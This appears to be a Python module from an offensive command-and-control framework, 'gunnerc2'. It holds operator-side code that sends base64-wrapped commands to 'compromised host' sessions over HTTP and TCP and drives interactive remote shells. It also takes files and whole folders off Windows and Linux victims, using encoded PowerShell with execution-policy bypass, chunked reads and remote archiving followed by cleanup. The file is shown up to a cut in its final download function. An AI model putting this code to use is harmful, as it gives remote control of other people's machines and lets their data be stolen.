import logging

logger = logging.getLogger(__name__)

import base64, socket
import re
import threading
from core import utils
from core.session_handlers import session_manager, sessions
from core.utils import defender
from core.session_handlers.sessions import SessionManager
import queue
import subprocess, os, sys
from tqdm import tqdm
from time import sleep
import signal
import tarfile
import zipfile
import time
import shutil
import tempfile
import readline
import ssl
from main import HISTORY_FILE

from colorama import init, Fore, Style
brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred = "\001" + Style.BRIGHT + Fore.RED + "\002"
brightblue = "\001" + Style.BRIGHT + Fore.BLUE + "\002"
reset = Style.RESET_ALL

global global_tcpoutput_blocker
global_tcpoutput_blocker = 0

def print_raw_progress(current, total, bar_width=40):
	percent = current / total
	done = int(bar_width * percent)
	bar = "[" + "#" * done + "-" * (bar_width - done) + f"] {int(percent * 100)}%"
	sys.stdout.write("\r" + bar)
	sys.stdout.flush()

def run_command_http(sid, cmd, output=True, defender_bypass=False, op_id=False):
	session = session_manager.sessions[sid]
	display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
	meta = session.metadata
	os_type = meta.get("os", "").lower()
	out_b64 = None

	if op_id:
		logger.debug(f"SETTING OP ID TO: {op_id}")
		session.merge_command_queue.setdefault(op_id, queue.Queue())
		session.merge_response_queue.setdefault(op_id, queue.Queue())

	else:
		logger.debug("SETTING ID TO CONSOLE")
		op_id = "console"
		session.merge_command_queue.setdefault(op_id, queue.Queue())
		session.merge_response_queue.setdefault(op_id, queue.Queue())

	defender_state = defender.is_active

	while not session.merge_response_queue[op_id].empty():
		try:
			session.merge_response_queue[op_id].get_nowait()

		except queue.Empty:
			break

	"""while not session.output_queue.empty():
		try:
			session.output_queue.get_nowait()

		except queue.Empty:
			break"""

	# === Session-Defender check ===
	logger.debug("CHECKING IF SESSION DEFENDER IS ENABLED!!")
	if defender_state and not defender_bypass:
		if os_type in ("windows", "linux"):
			if not defender.inspect_command(os_type, cmd):
				print(brightred + "[!] Command blocked by Session-Defender.")
				return None

	logger.debug("ENCODING COMMAND")
	b64_cmd = base64.b64encode(cmd.encode()).decode()

	try:
		#session.command_queue.put(b64_cmd)
		if op_id:
			logger.debug(f"SENDING COMMAND TO OPERATOR: {op_id}")
			session.merge_command_queue[op_id].put(b64_cmd)

		else:
			logger.debug("SENDING COMMAND DOWN CONSOLE QUEUE")
			session.merge_command_queue["console"].put(b64_cmd)

	except Exception as e:
		logger.debug(brightred + f"[!] ERROR failed to send command through the queue: {e}" + reset)

	if output:
		try:
			#out_b64 = session.output_queue.get()
			if op_id:
				logger.debug(f"GRABBING RESPONSE FROM OPERATOR: {op_id}")
				out_b64 = session.merge_response_queue[op_id].get()

			else:
				logger.debug("GRABBING RESPONSE FROM CONSOLE")
				out_b64 = session.merge_response_queue["console"].get()

		except Exception as e:
			logger.debug(brightred + f"[!] ERROR failed to get command output from queue: {e}" + reset)

	else:
		try:
			#out_b64 = session.output_queue.get_nowait()
			if op_id:
				out_b64 = session.merge_response_queue[op_id].get_nowait()

			else:
				out_b64 = session.merge_response_queue["console"].get_nowait()

		except Exception as e:
			logger.debug(brightred + f"[!] Failed to fetch output in a no wait manner!" + reset)


	if out_b64 and output:
		try:
			return base64.b64decode(out_b64).decode("utf-8", "ignore").strip()

		except Exception as e:
			logger.debug(brightred + f"[!] ERROR failed to decode command output: {e}" + reset)

	else:
		return

def run_command_tcp(sid, cmd, timeout=0.5, defender_bypass=False, portscan_active=False, timeoutprint=True, retries=0, op_id="console"):
	session = session_manager.sessions[sid]
	meta = session.metadata
	display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
	client_socket = session.handler
	os_type = meta.get("os", "").lower()
	recv_lock = threading.Lock()

	# ============================================================
	# QUICK DRAIN: drop any stray bytes left over from a previous
	# command, so they can't appear in our next read.
	client_socket.settimeout(0.0)
	client_socket.setblocking(False)
	try:
		while True:
			with session.lock:
				chunk = client_socket.recv(1024 * 2000)
			if not chunk:
				break
	except (socket.timeout, BlockingIOError, OSError, ssl.SSLWantReadError, ssl.SSLWantWriteError):
		pass

	finally:
		# put the timeout back for the real command
		with session.lock:
			client_socket.setblocking(True)
			client_socket.settimeout(timeout)
	# =============================================

	if not op_id:
		op_id = "console"
	
	# initialize the merge‐response map once
	if not hasattr(session, "merge_response_queue"):
		session.merge_response_queue = {}

	session.merge_response_queue.setdefault(op_id, queue.Queue())

	try:
		defender_state = defender.is_active

	except Exception as e:
		print(brightred + f"[!] An unknown error ocurred!")

	# === Session-Defender check ===
	if defender_state and not defender_bypass:
		if os_type in ("windows", "linux"):
			if not defender.inspect_command(os_type, cmd):
				print(brightred + "[!] Command blocked by Session-Defender.")
				return None

	start_tok = f"__OP__{op_id}__"   if op_id else None
	end_tok   = f"__ENDOP__{op_id}__" if op_id else None

	if op_id:
		if "windows" in os_type:
			# for a PowerShell-style Windows shell
			wrapped = (
				f'Write-Output "{start_tok}"; '
				f"{cmd}; "
				f'Write-Output "{end_tok}"'
			)
		else:
			# for a Unix/bash shell
			wrapped = f"echo {start_tok}; {cmd}; echo {end_tok}"
		send_cmd = wrapped
	else:
		send_cmd = cmd

	logger.debug(brightyellow + f"SET TCP CMD TO {send_cmd}")

	try:
		try:
			with session.lock:
				client_socket.sendall(send_cmd.encode() + b"\n")

		except Exception as e:
			print(brightred + f"[-] ERROR failed to send command over socket: {e}")
		
		with session.lock:
			client_socket.settimeout(timeout)
		chunks = []
		got_any = False
		attempt = 0

		def _reader(op_id, session):
			nonlocal got_any, attempt
			while True:
				try:
					with session.recv_lock:
						data = client_socket.recv(4096)
				except socket.timeout:
					# if portscan_active, retry until we get any data or hit max attempts
					if portscan_active:
						if not got_any:
							if retries != 0:
								if retries and attempt < retries:
									attempt += 1
									continue

								# otherwise give up on reading
								break
							continue

						else:
							break

					if not got_any:
						# real timeout
						if timeoutprint is True:
							print(brightred + f"[!] Timeout waiting for response from agent {display}")
							break

						else:
							break

				# end of stream
				if not data:
					break

				with session.recv_lock:
					chunks.append(data)
				got_any = True

				# stop as soon as we see both markers in the joined buffer
				joined = b"".join(chunks)
				if op_id and start_tok.encode() in joined and end_tok.encode() in joined:
					break

			# 6) Once we exit the loop, optionally drain any residual bytes so the
			#    next command doesn’t accidentally read this data.
			with session.lock:
				old_timeout = client_socket.gettimeout()
				client_socket.setblocking(False)

			try:
				while True:
					with session.lock:
						if not client_socket.recv(1024 * 2000):
							break
			except BlockingIOError:
				pass

			finally:
				with session.lock:
					client_socket.setblocking(True)
					client_socket.settimeout(old_timeout)

		sleep(0.03)
		
		reader = threading.Thread(target=_reader, args=(op_id, session), daemon=True)
		reader.start()
		reader.join()   # block until either we hit EOF/timeout policy or markers arrived

		# ─── Extract and stash ─────────────────────────────────────────────────
		# pull out our slice
		with session.recv_lock:
			response_bytes = b"".join(chunks)
			response = response_bytes.decode("utf-8", errors="ignore").strip()

		for other_op, q in session.merge_response_queue.items():
			if other_op == op_id:
				continue

			for mm in re.finditer(rf"__OP__{other_op}__\s*(.*?)\s*__ENDOP__{other_op}__", response, re.DOTALL):
				q.put(mm.group(1))

		logger.debug(brightyellow + f"GOT RESPONSE {response} TYPE {type(response)}")

		# ─── now pull out *your* own slice (and clear your queue if it’s fresh) ───
		logger.debug("RUNNING RE.SEARCH")
		logger.debug(f"VERIFIED START TOK IS {start_tok} END TOK IS {end_tok}")
		m = re.search(rf"{re.escape(start_tok)}\s*(.*?)\s*{re.escape(end_tok)}", response, re.DOTALL)

		if m:
			my_out = m.group(1)
			# flush any stale items from *your* queue
			try:
				while True:
					session.merge_response_queue[op_id].get_nowait()

			except queue.Empty:
				pass

		else:
			# fallback to whatever was queued for you (if anything)
			try:
				my_out = session.merge_response_queue[op_id].get_nowait()
				
			except queue.Empty:
				logger.debug(f"No queued output for op {op_id}; empty result")
				my_out = ""

		logger.debug("ABOUT TO NORMALIZE OUTPUT")

		# ─── Normalize & return ─────────────────────────────────────────────────
		clean = utils.normalize_output(my_out.strip(), send_cmd)
		return clean

	except Exception as e:
		return f"[!] Error: {e}"


def interactive_http_shell(sid):
	session = session_manager.sessions[sid]
	trans = session.transport
	transport = trans.upper()
	display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
	meta = session.metadata
	os_type = meta.get("os", "").lower()
	defender_state = defender.is_active

	session_hist = os.path.join(tempfile.gettempdir(), f"gunnerc2_http_{sid}.hist")
	readline.write_history_file(HISTORY_FILE)
	readline.clear_history()
	try:
		readline.read_history_file(session_hist)
	except FileNotFoundError:
		pass

	if os_type not in ("windows", "linux"):
		print(brightred + f"[!] ERROR unsupported operating system on compromised host {display}")
		return None

	orig_stp = signal.getsignal(signal.SIGTSTP)
	signal.signal(signal.SIGTSTP, lambda s, f: (_ for _ in ()).throw(EOFError))

	try:
		print(brightgreen + f"[*] Interactive {transport} shell with {display}. Type 'exit' to return.")

		while True:
			try:
				cmd = input(brightblue + f"{display}> ").strip()

			except EOFError:
					# Ctrl-Z pressed
					ans = input(brightgreen + f"\nBackground this {transport} shell? [y/N]: ").strip().lower()
					if ans in ("y", "yes"):
						print(brightyellow + f"[*] Backgrounded {transport} shell {display}")
						break
					else:
						continue

			except KeyboardInterrupt:
				# Ctrl-C pressed
				print(brightyellow + "\n(Press Ctrl-Z to background, or type 'exit' to quit)")
				continue

			session = session_manager.sessions[sid]
			meta = session.metadata
			os_type = meta.get("os", "").lower()

			# === Session-Defender check ===
			if defender_state:
				if not defender.inspect_command(os_type, cmd):
					print(brightred + "[!] Command blocked by Session-Defender.")
					continue

			if cmd.lower() in ("exit", "quit"):
				session = session_manager.sessions[sid]
				meta = session.metadata
				os_type = meta.get("os", "").lower()

				if session_manager.kill_http_session(sid, os_type):
					print(brightyellow + f"[*] Killed {transport} session {display}")
				else:
					print(brightred + f"[!] No such session {display}")
					
				break

			if cmd.strip().lower() in ("bg", "background", "back"):
				print(brightyellow + f"[*] Backgrounded {transport} session {display}")
				break

			if not cmd:
				continue

			
			while not session.output_queue.empty():
				try:
					session.output_queue.get_nowait()

				except queue.Empty:
					break

			b64_cmd = base64.b64encode(cmd.encode()).decode()
			session.command_queue.put(b64_cmd)

			# Wait for output from this session only
			out_b64 = session.output_queue.get()

			try:
				out = base64.b64decode(out_b64).decode("utf-8", "ignore")
			except Exception as e:
				out = brightred + f"[-] ERROR we hit an error while decoding the command output: {e}"

			print(out.rstrip())

	finally:
		readline.write_history_file(session_hist)
		readline.clear_history()
		try:
			readline.read_history_file(HISTORY_FILE)

		except FileNotFoundError:
			pass
		signal.signal(signal.SIGTSTP, orig_stp)

def interactive_tcp_shell(sid):
	session = session_manager.sessions[sid]
	trans = session.transport
	transport = trans.upper()
	display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
	client_socket = session_manager.sessions[sid].handler
	meta = session.metadata
	os_type = meta.get("os", "").lower()

	if os_type not in ("windows", "linux"):
		print(brightred + f"[!] ERROR unsupported operating system on compromised host {display}")
		return None

	defender_state = defender.is_active

	session_hist = os.path.join(tempfile.gettempdir(), f"gunnerc2_tcp_{sid}.hist")
	readline.write_history_file(HISTORY_FILE)
	readline.clear_history()
	try:
		readline.read_history_file(session_hist)
	except FileNotFoundError:
		pass

	orig_stp = signal.getsignal(signal.SIGTSTP)
	signal.signal(signal.SIGTSTP, lambda s, f: (_ for _ in ()).throw(EOFError))

	print(brightgreen + f"[*] Interactive {transport} shell with {display}. Type 'exit' to close.")

	if os_type == "linux":
		clean_shell_cmd = b'export PS1="" && unset PROMPT_COMMAND\n'
		with session.lock:
			client_socket.sendall(clean_shell_cmd)
			# drain any prompt leftovers
			client_socket.settimeout(1.0)
			try:
				drain = client_socket.recv(4096)

			except socket.timeout:
				pass

	try:
		while True:
			try:
				cmd = input(brightblue + f"{display}> ")

			except EOFError:
				# Ctrl-Z caught here
				ans = input(brightgreen + "\nBackground this shell? [y/N]: ").strip().lower()
				if ans in ("y", "yes"):
					print(brightyellow + f"[*] Backgrounded {transport} session {display}")
					break
				else:
					# redrawing prompt
					continue

			except KeyboardInterrupt:
				# Ctrl-C caught here
				print(brightyellow + "\n(Press Ctrl-Z to background, or type 'exit' to close)")
				continue

			# === Session-Defender check ===
			try:
				if defender_state:
					if not defender.inspect_command(os_type, cmd):
						print(brightred + "[!] Command blocked by Session-Defender.")
						continue

			except Exception as e:
				print(brightred + f"[!] Error happened in session defender")

			if cmd.strip().lower() in ("exit", "quit"):
				with session.lock:
					client_socket.close()
				del session_manager.sessions[sid]
				print(brightyellow + f"[*] Closed {transport} session {display}")
				break

			if cmd.strip().lower() in ("bg", "background", "back"):
				print(brightyellow + f"[*] Backgrounded {transport} session {display}")
				break

			if not cmd.strip():
				continue

			try:
				with session.lock:
					client_socket.sendall(cmd.encode() + b"\n")

			except BrokenPipeError:
				print(brightred + "[!] Connection closed by remote host.")
				break

			with session.lock:
				client_socket.settimeout(0.5)
			response = b''
			got_any = False

			while True:
				try:
					with session.lock:
						chunk = client_socket.recv(4096)

					if not chunk:
						break

					response += chunk
					got_any = True

				except (socket.timeout, ssl.SSLWantReadError, ssl.SSLWantWriteError):
					if not got_any:
						print(brightred + f"[!] Connection timed out waiting on agent {display}")
						break

					with session.lock:
						old_timeout = client_socket.gettimeout()
						# switch to non-blocking
						client_socket.setblocking(False)
					try:
						while True:
							with session.lock:
								client_socket.recv(1024 * 2000)

					except BlockingIOError:
						# no more data in the OS buffer
						pass

					except (socket.timeout, ssl.SSLWantReadError, ssl.SSLWantWriteError):
						pass

					finally:
						# restore original state
						with session.lock:
							client_socket.setblocking(True)
							client_socket.settimeout(old_timeout)

					break

			output = response.decode(errors='ignore').strip()
			clean = utils.normalize_output(output, cmd)
			print(clean)

			with session.lock:
				old_timeout = client_socket.gettimeout()
				client_socket.settimeout(0.0)
				client_socket.setblocking(False)

			try:
				while True:
					with session.lock:
						chunk = client_socket.recv(1024 * 2000)

					if not chunk:
						break

			except (socket.timeout, BlockingIOError, OSError, ssl.SSLWantReadError, ssl.SSLWantWriteError):
				pass

			finally:
				with session.lock:
					# put the timeout back for the real command
					client_socket.setblocking(True)
					client_socket.settimeout(old_timeout)

	except Exception as e:
		print(brightred + f"[!] Error: {e}")
		client_socket.close()
		del session_manager.sessions[sid]

	finally:
		readline.write_history_file(session_hist)
		readline.clear_history()

		try:
			readline.read_history_file(HISTORY_FILE)

		except FileNotFoundError:
			pass

		signal.signal(signal.SIGTSTP, orig_stp)

### 🧨 File download logic:

# Create encoded powershell command string
def build_powershell_encoded_download(remote_file):
	#safe_path = remote_file.replace("\\", "\\\\")
	#print(remote_file)
	#print(safe_path)



	raw_command = (
		f"[Console]::OutputEncoding = [System.Text.Encoding]::ASCII; "
		f"$bytes = [IO.File]::ReadAllBytes('{remote_file}'); "
		"[Convert]::ToBase64String($bytes)"
	)
	#print(raw_command)
	encoded_bytes = raw_command.encode("utf-16le")
	encoded_b64 = base64.b64encode(encoded_bytes).decode()
	full_cmd = f"powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand {encoded_b64}"
	return full_cmd

	# Encode to UTF-16LE as required by EncodedCommand
	#utf16_command = raw_command.encode("utf-16le")
	#encoded_command = base64.b64encode(utf16_command).decode()

	#return f"powershell -EncodedCommand {encoded_command}"



def download_file_http(sid, remote_file, local_file):
	session = session_manager.sessions[sid]
	meta = session.metadata

	if meta.get("os", "").lower() == "linux":
		host = meta.get("hostname", "").lower()
		CHUNK_SIZE = 30000  # Number of bytes per chunk (before base64 encoding)
		MAX_CHUNKS = 10000  # Safeguard to prevent infinite loop

		# Get file size first
		size_cmd = f"stat -c %s {remote_file}"
		session.command_queue.put(base64.b64encode(size_cmd.encode()).decode())
		file_size_raw = session.output_queue.get()

		print(brightyellow + f"[*] Downloading file from {host} in chunks...")

		try:
			file_size = int(base64.b64decode(file_size_raw).decode().strip())
		except:
			print(brightred + f"[-] Failed to get file size for {remote_file}")
			return

		total_chunks = (file_size + CHUNK_SIZE - 1) // CHUNK_SIZE
		collected_b64 = ""
		collection = bytearray()

		with tqdm(total=total_chunks, desc="Downloading", unit="chunk") as pbar:
			for i in range(total_chunks):
				offset = i * CHUNK_SIZE
				chunk_cmd = f"tail -c +{offset + 1} {remote_file} | head -c {CHUNK_SIZE} | base64"
				b64_chunk_cmd = base64.b64encode(chunk_cmd.encode()).decode()

				session.command_queue.put(b64_chunk_cmd)
				chunk_output = session.output_queue.get()

				try:
					chunk_decoded = base64.b64decode(chunk_output)
					data_decode = base64.b64decode(chunk_decoded)
					collection.extend(data_decode)
					#collected_b64 += chunk_decoded
					pbar.update(1)
				except Exception as e:
					print(brightred + f"[-] Error decoding chunk {i + 1}: {e}")
					break

		try:
			#decoded_file = base64.b64decode(collected_b64.encode())

			with open(local_file, "wb") as f:
				f.write(collection)

			with open(local_file, "rb") as f:
				bom = f.read(2)

			# UTF-16LE BOM is 0xFF 0xFE
			if bom == b"\xff\xfe":
				# it’s UTF-16LE — convert it in-place
				tmp = local_file + ".utf8"
				subprocess.run(['iconv', '-f', 'UTF-16LE', '-t', 'UTF-8', local_file, '-o', local_file + '.tmp'])
				os.replace(local_file + '.tmp', local_file)
				
				#print(f"[+] Converted {local_file} from UTF-16LE → UTF-8")

			else:
				pass

			print(brightgreen + f"[+] Download complete. Saved to {local_file}")

		except Exception as e:
			print(brightred + f"[!] Error decoding final file: {e}")

	elif meta.get("os", "") .lower() == "windows":
		CHUNK_SIZE = 1024 * 1024  # Adjust safely for command length + base64
		MAX_CHUNKS = 10000

		print(brightyellow + f"[*] Downloading file from Windows agent {sid} in chunks...")

		# Step 1: Get file size
		size_cmd = (
		f"$s=(Get-Item \"{remote_file}\").Length;"
		f"[System.Text.Encoding]::UTF8.GetBytes($s.ToString()) -join ','"
		)

		b64_size_cmd = base64.b64encode(size_cmd.encode()).decode()
		session.command_queue.put(b64_size_cmd)
		size_b64 = session.output_queue.get()
		print(size_b64)

		try:
			size_str = bytes([int(x) for x in base64.b64decode(size_b64).decode().split(",")]).decode()
			file_size = int(size_str.strip())
			#size_str = base64.b64decode(size_b64).decode().strip()
			#file_size = int(size_str)

		except Exception as e:
			print(brightred + f"[-] Failed to parse file size: {e}")
			return

		total_chunks = (file_size + CHUNK_SIZE - 1) // CHUNK_SIZE
		#print(total_chunks)
		#collected_b64 = ""
		collected_b64 = bytearray()
		collection = bytearray()

		with tqdm(total=total_chunks, desc="Downloading", unit="chunk") as pbar:
			for i in range(total_chunks):
				offset = i * CHUNK_SIZE

				# Step 2: Read chunk using PowerShell and base64 encode it
				chunk_cmd = (
					f"$fs = [System.IO.File]::OpenRead(\"{remote_file}\");"
					f"$fs.Seek({offset},'Begin') > $null;"
					f"$buf = New-Object byte[] {CHUNK_SIZE};"
					f"$read = $fs.Read($buf, 0, {CHUNK_SIZE});"
					f"$fs.Close();"
					f"[Convert]::ToBase64String($buf, 0, $read)"
				)

				b64_chunk_cmd = base64.b64encode(chunk_cmd.encode()).decode()
				session.command_queue.put(b64_chunk_cmd)
				chunk_output = session.output_queue.get()

				try:
					#chunk_decoded = base64.b64decode(chunk_output).decode()
					chunk_decoded = base64.b64decode(chunk_output)
					data_decode = base64.b64decode(chunk_decoded)
					collection.extend(data_decode)
					#collected_b64 += chunk_decoded
					pbar.update(1)

				except Exception as e:
					print(brightred + f"[-] Error decoding chunk {i + 1}: {e}")
					break

		# Step 3: Final decode & write
		try:
			#print(type(collected_b64))
			#print(collected_b64)
			#collect_decoded = base64.b64decode(collected_b64)
			#decode_bytes = collect_decoded.decode(errors='ignore').strip()
			
			with open(local_file, "wb") as f:
				f.write(collection)


			with open(local_file, "rb") as f:
				bom = f.read(2)

			# UTF-16LE BOM is 0xFF 0xFE
			if bom == b"\xff\xfe":
				# it’s UTF-16LE — convert it in-place
				tmp = local_file + ".utf8"
				subprocess.run(['iconv', '-f', 'UTF-16LE', '-t', 'UTF-8', local_file, '-o', local_file + '.tmp'])
				os.replace(local_file + '.tmp', local_file)
				
				#print(f"[+] Converted {local_file} from UTF-16LE → UTF-8")

			else:
				pass
			#subprocess.run(['iconv', '-f', 'UTF-16LE', '-t', 'UTF-8', local_file, '-o', local_file + '.tmp'])
			#os.replace(local_file + '.tmp', local_file)

			print(brightgreen + f"[+] Download complete. Saved to {local_file}")

		except Exception as e:
			print(brightred + f"[!] Error decoding final file: {e}")

def download_folder_http(sid, local_dir, remote_dir):
	session = session_manager.sessions[sid]
	display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
	meta = session.metadata
	os_type = meta.get("os","").lower()

	remote_dir = remote_dir.rstrip("/\\")
	base = os.path.basename(remote_dir)

	try:
		os.makedirs(local_dir, exist_ok=True)

	except Exception as e:
		print(brightred + f"[-] ERROR failed to create local output directory: {e}")

	local_zip = os.path.join(local_dir, f"{base}.zip")

	if "windows" in os_type:
		remote_zip = f"{remote_dir}.zip"
		# 1) create an empty zip if needed
		cmd = (
			f"\"if(-Not (Test-Path \"{remote_zip}\"))"
			f"{{Set-Content \"{remote_zip}\" ([byte[]](80,75,5,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0))}}\""
		)

		try:
			b64_cmd = base64.b64encode(cmd.encode()).decode()

		except Exception as e:
			print(brightred + f"[-] ERROR failed to encode command: {e}")

		session.command_queue.put(b64_cmd)
		#session.output_queue.get()

		# 2) copy the folder contents into it via .NET
		zip_cmd = (
			"[Reflection.Assembly]::LoadWithPartialName('System.IO.Compression.FileSystem') | Out-Null; "
			f"[IO.Compression.ZipFile]::CreateFromDirectory(\"{remote_dir}\",\"{remote_zip}\","
			"[IO.Compression.CompressionLevel]::Optimal,$false)"
		)


		print(brightyellow + f"[*] Zipping remote folder {remote_dir} → {remote_zip}…")

		try:
			b64_cmd = base64.b64encode(zip_cmd.encode()).decode()

		except Exception as e:
			print(brightred + f"[-] ERROR failed to encode command: {e}")

		session.command_queue.put(b64_cmd)
		#session.output_queue.get()

		# 2a) wait until the zip actually exists on the remote
		check_ps = (
			f"if (Test-Path \"{remote_zip}\") "
			"{{ Write-Output 'EXISTS' }} else {{ Write-Output 'NOPE' }}"
		)

		print(brightyellow + "[*] Waiting for remote archive to appear…")
		try:
			b64_cmd = base64.b64encode(check_ps.encode()).decode()

		except Exception as e:
			print(brightred + f"[-] ERROR failed to encode command: {e}")

		while True:
			session.command_queue.put(b64_cmd)
			out = session.output_queue.get()
			out = base64.b64decode(out)

			try:
				out = out.decode("utf-8", errors="ignore").strip()

			except Exception as e:
				print(brightred + f"[-] ERROR failed to decode command: {e}")

			try:
				if "EXISTS" in out or "exists" in out:
					break
				time.sleep(1)

			except Exception as e:
				print(brightred + f"[-] ERROR failed to strip command output: {e}")

		# 3) download the .zip
		try:
			local_zip = local_dir.rstrip(os.sep) + ".zip"

		except Exception as e:
			print(brightred + f"[-] ERROR failed to define local zip variable: {e}")

		print(brightyellow + f"[*] Downloading archive to {local_zip}…")

		session.output_queue.get()
		#remote_zip = remote_zip.replace("\\", "\\\\")
		download_file_http(sid, remote_zip, local_zip)

		# 4) extract locally
		if not os.path.isdir(local_dir):
			os.makedirs(local_dir, exist_ok=True)

		print(brightyellow + f"[*] Extracting {local_zip} → {local_dir}…")
		with zipfile.ZipFile(local_zip, 'r') as zf:
			for info in zf.infolist():
				# normalize any backslashes to forward slashes
				path = info.filename.replace('\\', '/')
				# directory entry if ends with slash or is_dir()
				is_dir = path.endswith('/') or getattr(info, "is_dir", lambda: False)()
				dest_path = os.path.join(local_dir, *path.split('/'))

				if is_dir:
					os.makedirs(dest_path, exist_ok=True)
					continue

				# file entry
				os.makedirs(os.path.dirname(dest_path), exist_ok=True)
				with zf.open(info) as src, open(dest_path, 'wb') as dst:
					shutil.copyfileobj(src, dst)

		os.remove(local_zip)

		# 5) cleanup remote
		cmd = f"Remove-Item \"{remote_zip}\" -Force"
		try:
			b64_cmd = base64.b64encode(cmd.encode()).decode()

		except Exception as e:
			print(brightred + f"[-] ERROR failed to encode command: {e}")

		session.command_queue.put(b64_cmd)
		session.output_queue.get()

		print(brightgreen + "[+] Extraction complete")

	elif "linux" in os_type:
		remote_tar = f"/tmp/{base}.tar.gz"

		print(brightyellow + f"[*] Archiving remote folder {remote_dir} → {remote_tar}…")
		cmd = f"tar czf \"{remote_tar}\" -C \"{remote_dir}\" ."
		
		try:
			b64_cmd = base64.b64encode(cmd.encode()).decode()

		except Exception as e:
			print(brightred + f"[-] ERROR failed to encode command: {e}")

		session.command_queue.put(b64_cmd)
	
		try:
			local_tar = local_dir.rstrip(os.sep) + ".tar.gz"

		except Exception as e:
			print(brightred + f"[-] ERROR failed to define path for local zip archive: {e}")

		print(brightyellow + f"[*] Downloading archive to {local_tar}…")

		download_file_tcp(sid, remote_tar, local_tar)

		print(brightyellow + f"[*] Extracting {local_tar} → {local_dir}…")

		try:
			with tarfile.open(local_tar, "r:gz") as t:
				try:
					t.extractall(path=local_dir)

				except Exception as e:
					print(brightred + f"[-] ERROR failed to extract files from local zip archive: {e}")

		except Exception as e:
			print(brightred + f"[-] ERROR failed to open local zip archive: {e}")

		try:
			os.remove(local_tar)

		except Exception as e:
			print(brightred + f"[-] ERROR failed to delete local zip archive in cleanup: {e}")

		cmd = f"rm -rf \"{remote_tar}\""

		try:
			b64_cmd = base64.b64encode(cmd.encode()).decode()

		except Exception as e:
			print(brightred + f"[-] ERROR failed to encode command: {e}")

		session.command_queue.put(b64_cmd)
		
		print(brightgreen + "[+] Extraction complete")


def download_folder_tcp(sid, remote_dir, local_dir):
	session = session_manager.sessions[sid]
	meta = session.metadata
	os_type = meta.get("os","").lower()

	remote_dir = remote_dir.rstrip("/\\")
	base = os.path.basename(remote_dir)

	if "windows" in os_type:
		remote_zip = f"{remote_dir}.zip"
		# create empty zip
		cmd = (
			f"\"if(-Not (Test-Path \"{remote_zip}\"))"
			f"{{Set-Content \"{remote_zip}\" ([byte[]](80,75,5,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0))}}\""
		)
		run_quiet_tcpcmd(sid, cmd)

		# COM copy into zip
		zip_cmd = (
			"[Reflection.Assembly]::LoadWithPartialName('System.IO.Compression.FileSystem') | Out-Null; "
			f"[IO.Compression.ZipFile]::CreateFromDirectory(\"{remote_dir}\",\"{remote_zip}\","
			"[IO.Compression.CompressionLevel]::Optimal,$false)"
		)

		print(brightyellow + f"[*] Zipping remote folder {remote_dir} → {remote_zip}…")
		run_quiet_tcpcmd(sid, zip_cmd)

		check_ps = (
			f"if (Test-Path \"{remote_zip}\") "
			"{{ Write-Output 'EXISTS' }} else {{ Write-Output 'NOPE' }}"
		)

		try:
			while True:
				global_tcpoutput_blocker = 0
				out = run_command_tcp(sid, check_ps, timeout=0.5)
				try:
					if "EXISTS" in out or "exists" in out:
						break
					time.sleep(1)

				except Exception as e:
					print(brightred + f"[-] ERROR failed to strip command output: {e}")

		except Exception as e:
			print(brightred + f"[-] ERROR we hit an unknown error while checking for remote zip existence: {e}")

		try:
			local_zip = local_dir.rstrip(os.sep) + ".zip"

		except Exception as e:
			print(brightred + f"[-] ERROR failed to define path for local zip archive: {e}")

		print(brightyellow + f"[*] Downloading archive to {local_zip}…")
		download_file_tcp(sid, remote_zip, local_zip)

		if not os.path.isdir(local_dir):
			try:
				os.makedirs(local_dir, exist_ok=True)

			except Exception as e:
				print(brightred + f"[-] ERROR failed to create local output directory: {e}")

		print(brightyellow + f"[*] Extracting {local_zip} → {local_dir}…")
		with zipfile.ZipFile(local_zip, 'r') as zf:
			for info in zf.infolist():
				# normalize any backslashes to forward slashes
				path = info.filename.replace('\\', '/')
				# directory entry if ends with slash or is_dir()
				is_dir = path.endswith('/') or getattr(info, "is_dir", lambda: False)()
				dest_path = os.path.join(local_dir, *path.split('/'))

				if is_dir:
					os.makedirs(dest_path, exist_ok=True)
					continue

				# file entry
				os.makedirs(os.path.dirname(dest_path), exist_ok=True)

				
				with zf.open(info) as src, open(dest_path, 'wb') as dst:
					shutil.copyfileobj(src, dst)

		try:
			os.remove(local_zip)

		except Exception as e:
			print(brightred + f"[-] ERROR failed to delete local zip archive in cleanup stage: {e}")

		cmd = f"Remove-Item \"{remote_zip}\" -Force"
		run_quiet_tcpcmd(sid, cmd)

		print(brightgreen + "[+] Extraction complete")

	elif "linux" in os_type:
		remote_tar = f"/tmp/{base}.tar.gz"

		print(brightyellow + f"[*] Archiving remote folder {remote_dir} → {remote_tar}…")
		cmd = f"tar czf \"{remote_tar}\" -C \"{remote_dir}\" ."
		
		run_quiet_tcpcmd(sid, cmd)

		try:
			local_tar = local_dir.rstrip(os.sep) + ".tar.gz"

		except Exception as e:
			print(brightred + f"[-] ERROR failed defining local zip location: {e}")

		print(brightyellow + f"[*] Downloading archive to {local_tar}…")

		download_file_tcp(sid, remote_tar, local_tar)

		print(brightyellow + f"[*] Extracting {local_tar} → {local_dir}…")

		try:
			with tarfile.open(local_tar, "r:gz") as t:
				try:
					t.extractall(path=local_dir)

				except Exception as e:
					print(brightred + f"[-] ERROR failed to extract zip archive: {e}")

		except Exception as e:
			print(brightred + f"[-] ERROR failed to open local zip archive: {e}")

		try:
			os.remove(local_tar)

		except Exception as e:
			print(brightred + f"[-] ERROR failed to delete local zip archive in cleanup stage: {e}")

		cmd = f"rm -rf \"{remote_tar}\""
		run_quiet_tcpcmd(sid, cmd)

		print(brightgreen + "[+] Extraction complete")

	else:
		print(brightred + f"[-] ERROR unsupported operating system.")




def download_file_tcp(sid, remote_file, local_file):
	client_socket = session_manager.sessions[sid].handler
	session = session_manager.sessions[sid]
	meta = session.metadata

	if meta.get("os", "").lower() == "linux":
		CHUNK_SIZE = 60000
		MAX_CHUNKS = 10000
		host = meta.get("hostname", "").lower()

